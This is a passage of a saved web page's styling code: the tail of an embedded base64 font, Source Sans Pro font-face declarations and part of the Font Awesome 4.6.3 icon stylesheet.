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)
                    format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 600;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwmhduz8A.woff2*/ url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 600;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwkxduz8A.woff2*/ url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* greek-ext */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 600;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwmxduz8A.woff2*/ url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 600;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwlBduz8A.woff2*/ url() format("woff2");
                unicode-range: U+0370-03FF;
            }
            /* vietnamese */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 600;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwmBduz8A.woff2*/ url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 600;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwmRduz8A.woff2*/ url() format("woff2");
                unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 600;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwlxdu.woff2*/ url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwmhduz8A.woff2*/ url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwkxduz8A.woff2*/ url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* greek-ext */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwmxduz8A.woff2*/ url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwlBduz8A.woff2*/ url() format("woff2");
                unicode-range: U+0370-03FF;
            }
            /* vietnamese */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwmBduz8A.woff2*/ url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwmRduz8A.woff2*/ url() format("woff2");
                unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwlxdu.woff2*/ url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
        </style>
        <!-- Font awesome for social icons for now -->
        <script data-savepage-type="" type="text/plain" data-savepage-src="https://use.fontawesome.com/a1448f816b.js"></script>
        <script data-savepage-type="" type="text/plain" ecommerce-type="extend-native-history-api"></script>
        <script data-savepage-type="" type="text/plain"></script>
        <style data-savepage-href="https://use.fontawesome.com/a1448f816b.css" media="all">
            /*!
 *  Font Awesome v4.6.3 by @davegandy - http://fontawesome.io - @fontawesome
 *  License - http://fontawesome.io/license (Font: SIL OFL 1.1, CSS: MIT License)
 */
            /*savepage-import-url=//use.fontawesome.com/releases/v4.6.3/css/font-awesome-css.min.css*/
            .fa {
                display: inline-block;
                font: normal normal normal 14px/1 FontAwesome;
                font-size: inherit;
                text-rendering: auto;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
            }
            .fa-lg {
                font-size: 1.33333333em;
                line-height: 0.75em;
                vertical-align: -15%;
            }
            .fa-2x {
                font-size: 2em;
            }
            .fa-3x {
                font-size: 3em;
            }
            .fa-4x {
                font-size: 4em;
            }
            .fa-5x {
                font-size: 5em;
            }
            .fa-fw {
                width: 1.28571429em;
                text-align: center;
            }
            .fa-ul {
                padding-left: 0;
                margin-left: 2.14285714em;
                list-style-type: none;
            }
            .fa-ul > li {
                position: relative;
            }
            .fa-li {
                position: absolute;
                left: -2.14285714em;
                width: 2.14285714em;
                top: 0.14285714em;
                text-align: center;
            }
            .fa-li.fa-lg {
                left: -1.85714286em;
            }
            .fa-border {
                padding: 0.2em 0.25em 0.15em;
                border: solid 0.08em #eee;
                border-radius: 0.1em;
            }
            .fa-pull-left {
                float: left;
            }
            .fa-pull-right {
                float: right;
            }
            .fa.fa-pull-left {
                margin-right: 0.3em;
            }
            .fa.fa-pull-right {
                margin-left: 0.3em;
            }
            .pull-right {
                float: right;
            }
            .pull-left {
                float: left;
            }
            .fa.pull-left {
                margin-right: 0.3em;
            }
            .fa.pull-right {
                margin-left: 0.3em;
            }
            .fa-spin {
                -webkit-animation: fa-spin 2s infinite linear;
                animation: fa-spin 2s infinite linear;
            }
            .fa-pulse {
                -webkit-animation: fa-spin 1s infinite steps(8);
                animation: fa-spin 1s infinite steps(8);
            }
            @-webkit-keyframes fa-spin {
                0% {
                    -webkit-transform: rotate(0deg);
                    transform: rotate(0deg);
                }
                100% {
                    -webkit-transform: rotate(359deg);
                    transform: rotate(359deg);
                }
            }
            @keyframes fa-spin {
                0% {
                    -webkit-transform: rotate(0deg);
                    transform: rotate(0deg);
                }
                100% {
                    -webkit-transform: rotate(359deg);
                    transform: rotate(359deg);
                }
            }
            .fa-rotate-90 {
                -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
                -webkit-transform: rotate(90deg);
                -ms-transform: rotate(90deg);
                transform: rotate(90deg);
            }
            .fa-rotate-180 {
                -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
                -webkit-transform: rotate(180deg);
                -ms-transform: rotate(180deg);
                transform: rotate(180deg);
            }
            .fa-rotate-270 {
                -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
                -webkit-transform: rotate(270deg);
                -ms-transform: rotate(270deg);
                transform: rotate(270deg);
            }
            .fa-flip-horizontal {
                -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
                -webkit-transform: scale(-1, 1);
                -ms-transform: scale(-1, 1);
                transform: scale(-1, 1);
            }
            .fa-flip-vertical {
                -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
                -webkit-transform: scale(1, -1);
                -ms-transform: scale(1, -1);
                transform: scale(1, -1);
            }
            :root .fa-rotate-90,
            :root .fa-rotate-180,
            :root .fa-rotate-270,
            :root .fa-flip-horizontal,
            :root .fa-flip-vertical {
                filter: none;
            }
            .fa-stack {
                position: relative;
                display: inline-block;
                width: 2em;
                height: 2em;
                line-height: 2em;
                vertical-align: middle;
            }
            .fa-stack-1x,
            .fa-stack-2x {
                position: absolute;
                left: 0;
                width: 100%;
                text-align: center;
            }
            .fa-stack-1x {
                line-height: inherit;
            }
            .fa-stack-2x {
                font-size: 2em;
            }
            .fa-inverse {
                color: #fff;
            }
            .fa-glass:before {
                content: "\f000";
            }
            .fa-music:before {
                content: "\f001";
            }
            .fa-search:before {
                content: "\f002";
            }
            .fa-envelope-o:before {
                content: "\f003";
            }
            .fa-heart:before {
                content: "\f004";
            }
            .fa-star:before {
                content: "\f005";
            }
            .fa-star-o:before {
                content: "\f006";
            }
            .fa-user:before {
                content: "\f007";
            }
            .fa-film:before {
                content: "\f008";
            }
            .fa-th-large:before {
                content: "\f009";
            }
            .fa-th:before {
                content: "\f00a";
            }
            .fa-th-list:before {
                content: "\f00b";
            }
            .fa-check:before {
                content: "\f00c";
            }
            .fa-remove:before,
            .fa-close:before,
            .fa-times:before {
                content: "\f00d";
            }
            .fa-search-plus:before {
                content: "\f00e";
            }
            .fa-search-minus:before {
                content: "\f010";
            }
            .fa-power-off:before {
                content: "\f011";
            }
            .fa-signal:before {
                content: "\f012";
            }
            .fa-gear:before,
            .fa-cog:before {
                content: "\f013";
            }
            .fa-trash-o:before {
                content: "\f014";
            }
            .fa-home:before {
                content: "\f015";
            }
            .fa-file-o:before {
                content: "\f016";
            }
            .fa-clock-o:before {
                content: "\f017";
            }
            .fa-road:before {
                content: "\f018";
            }
            .fa-download:before {
                content: "\f019";
            }
            .fa-arrow-circle-o-down:before {
                content: "\f01a";
            }
            .fa-arrow-circle-o-up:before {
                content: "\f01b";
            }
            .fa-inbox:before {
                content: "\f01c";
            }
            .fa-play-circle-o:before {
                content: "\f01d";
            }
            .fa-rotate-right:before,
            .fa-repeat:before {
                content: "\f01e";
            }
            .fa-refresh:before {
                content: "\f021";
            }
            .fa-list-alt:before {
                content: "\f022";
            }
            .fa-lock:before {
                content: "\f023";
            }
            .fa-flag:before {
                content: "\f024";
            }
            .fa-headphones:before {
                content: "\f025";
            }
            .fa-volume-off:before {
                content: "\f026";
            }
            .fa-volume-down:before {
                content: "\f027";
            }
            .fa-volume-up:before {
                content: "\f028";
            }
            .fa-qrcode:before {
                content: "\f029";
            }
            .fa-barcode:before {
                content: "\f02a";
            }
            .fa-tag:before {
                content: "\f02b";
            }
            .fa-tags:before {
                content: "\f02c";
            }
            .fa-book:before {
                content: "\f02d";
            }
            .fa-bookmark:before {
                content: "\f02e";
            }
            .fa-print:before {
                content: "\f02f";
            }
            .fa-camera:before {
                content: "\f030";
            }
            .fa-font:before {
                content: "\f031";
            }
            .fa-bold:before {
                content: "\f032";
            }
            .fa-italic:before {
                content: "\f033";
            }
            .fa-text-height:before {
                content: "\f034";
            }
            .fa-text-width:before {
                content: "\f035";
            }
            .fa-align-left:before {
                content: "\f036";
            }
            .fa-align-center:before {
                content: "\f037";
            }
            .fa-align-right:before {
                content: "\f038";
            }
            .fa-align-justify:before {
                content: "\f039";
            }
            .fa-list:before {
                content: "\f03a";
            }
            .fa-dedent:before,
            .fa-outdent:before {
                content: "\f03b";
            }
            .fa-indent:before {
                content: "\f03c";
            }
            .fa-video-camera:before {
                content: "\f03d";
            }
            .fa-photo:before,
            .fa-image:before,
            .fa-picture-o:before {
                content: "\f03e";
            }
            .fa-pencil:before {
                content: "\f040";
            }
            .fa-map-marker:before {
                content: "\f041";
            }
            .fa-adjust:before {
                content: "\f042";
            }
            .fa-tint:before {
                content: "\f043";
            }
            .fa-edit:before,
            .fa-pencil-square-o:before {
                content: "\f044";
            }
            .fa-share-square-o:before {
                content: "\f045";
            }
            .fa-check-square-o:before {
                content: "\f046";
            }
            .fa-arrows:before {
                content: "\f047";
            }
            .fa-step-backward:before {
                content: "\f048";
            }
            .fa-fast-backward:before {
                content: "\f049";
            }
            .fa-backward:before {
                content: "\f04a";
            }
            .fa-play:before {
                content: "\f04b";
            }
            .fa-pause:before {
                content: "\f04c";
            }
            .fa-stop:before {
                content: "\f04d";
            }
            .fa-forward:before {
                content: "\f04e";
            }
            .fa-fast-forward:before {
                content: "\f050";
            }
            .fa-step-forward:before {
                content: "\f051";
            }
            .fa-eject:before {
                content: "\f052";
            }
            .fa-chevron-left:before {
                content: "\f053";
            }
            .fa-chevron-right:before {
                content: "\f054";
            }
            .fa-plus-circle:before {
                content: "\f055";
            }
            .fa-minus-circle:before {
                content: "\f056";
            }
            .fa-times-circle:before {
                content: "\f057";
            }
            .fa-check-circle:before {
                content: "\f058";
            }
            .fa-question-circle:before {
                content: "\f059";
            }
            .fa-info-circle:before {
                content: "\f05a";
            }
            .fa-crosshairs:before {
                content: "\f05b";
            }
            .fa-times-circle-o:before {
                content: "\f05c";
            }
            .fa-check-circle-o:before {
                content: "\f05d";
            }
            .fa-ban:before {
                content: "\f05e";
            }
            .fa-arrow-left:before {
                content: "\f060";
            }
            .fa-arrow-right:before {
                content: "\f061";
            }
            .fa-arrow-up:before {
                content: "\f062";
            }
            .fa-arrow-down:before {
                content: "\f063";
            }
            .fa-mail-forward:before,
            .fa-share:before {
                content: "\f064";
            }
            .fa-expand:before {
                content: "\f065";
            }
            .fa-compress:before {
                content: "\f066";
            }
            .fa-plus:before {
                content: "\f067";
            }
            .fa-minus:before {
                content: "\f068";
            }
            .fa-asterisk:before {
                content: "\f069";
            }
            .fa-exclamation-circle:before {
                content: "\f06a";
            }
            .fa-gift:before {
                content: "\f06b";
            }
            .fa-leaf:before {
                content: "\f06c";
            }
            .fa-fire:before {
                content: "\f06d";
            }
            .fa-eye:before {
                content: "\f06e";
            }
            .fa-eye-slash:before {
                content: "\f070";
            }
            .fa-warning:before,
            .fa-exclamation-triangle:before {
                content: "\f071";
            }
            .fa-plane:before {
                content: "\f072";
            }
            .fa-calendar:before {
                content: "\f073";
            }
            .fa-random:before {
                content: "\f074";
            }
            .fa-comment:before {
                content: "\f075";
            }
            .fa-magnet:before {
                content: "\f076";
            }
            .fa-chevron-up:before {
                content: "\f077";
            }
            .fa-chevron-down:before {
                content: "\f078";
            }
            .fa-retweet:before {
                content: "\f079";
            }
            .fa-shopping-cart:before {
                content: "\f07a";
            }
            .fa-folder:before {
                content: "\f07b";
            }
            .fa-folder-open:before {
                content: "\f07c";
            }
            .fa-arrows-v:before {
                content: "\f07d";
            }
            .fa-arrows-h:before {
                content: "\f07e";
            }
            .fa-bar-chart-o:before,
            .fa-bar-chart:before {
                content: "\f080";
            }
            .fa-twitter-square:before {
                content: "\f081";
            }
            .fa-facebook-square:before {
                content: "\f082";
            }
            .fa-camera-retro:before {
                content: "\f083";
            }
            .fa-key:before {
                content: "\f084";
            }
            .fa-gears:before,
            .fa-cogs:before {
                content: "\f085";
            }
            .fa-comments:before {
                content: "\f086";
            }
            .fa-thumbs-o-up:before {
                content: "\f087";
            }
            .fa-thumbs-o-down:before {
                content: "\f088";
            }
            .fa-star-half:before {
                content: "\f089";
            }
            .fa-heart-o:before {
                content: "\f08a";
            }
            .fa-sign-out:before {
                content: "\f08b";
            }
            .fa-linkedin-square:before {
                content: "\f08c";
            }
            .fa-thumb-tack:before {
                content: "\f08d";
            }
            .fa-external-link:before {
                content: "\f08e";
            }
            .fa-sign-in:before {
                content: "\f090";
            }
            .fa-trophy:before {
                content: "\f091";
            }
            .fa-github-square:before {
                content: "\f092";
            }
            .fa-upload:before {
                content: "\f093";
            }
            .fa-lemon-o:before {
                content: "\f094";
            }
            .fa-phone:before {
                content: "\f095";
            }
            .fa-square-o:before {
                content: "\f096";
            }
            .fa-bookmark-o:before {
                content: "\f097";
            }
            .fa-phone-square:before {
                content: "\f098";
            }
            .fa-twitter:before {
                content: "\f099";
            }
            .fa-facebook-f:before,
            .fa-facebook:before {
                content: "\f09a";
            }
            .fa-github:before {
                content: "\f09b";
            }
            .fa-unlock:before {
                content: "\f09c";
            }
            .fa-credit-card:before {
                content: "\f09d";
            }
            .fa-feed:before,
            .fa-rss:before {
                content: "\f09e";
            }
            .fa-hdd-o:before {
                content: "\f0a0";
            }
            .fa-bullhorn:before {
                content: "\f0a1";
            }
            .fa-bell:before {
                content: "\f0f3";
            }
            .fa-certificate:before {
                content: "\f0a3";
            }
